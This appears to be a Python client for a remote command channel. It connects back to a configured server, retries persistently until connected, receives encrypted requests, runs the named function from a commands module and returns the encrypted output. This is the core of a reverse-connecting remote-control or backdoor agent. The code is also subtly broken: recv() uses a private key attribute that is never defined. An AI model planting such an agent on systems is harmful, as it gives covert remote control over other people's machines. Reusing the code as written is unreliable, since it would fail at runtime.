# -*- coding: utf-8 -*-

import socket
import time

from utils import RequestParser, encrypt, decrypt
import commands


class Client(object):

    def __init__(self, host, port, public_key):
        self.socket = None
        self.port = port
        self.host = host
        self.public_key = public_key

    def run(self):
        self.connect_server()
        while True:
            request = RequestParser(self.recv())

            if request.is_valid:
                output = self.exec_command(request.command, request.args)
                self.send(output)
            else:
                print("Connection lost.")
                self.connect_server()

    def connect_server(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connected = False
        while not connected:
            try:
                self.socket.connect((self.host, self.port))
                connected = True
                print("Connected.")
            except socket.error:
                print("Trying to connect...")
                time.sleep(1)

    def exec_command(self, command_name, command_args):
        if hasattr(commands, command_name):
            output = getattr(commands, command_name).run(command_args)
        else:
            output = 'Unknown command.'
        return output

    def send(self, data):
        self.socket.sendall(encrypt(data, self.public_key))

    def recv(self):
        return decrypt(self.socket.recv(2048), self.private_key)
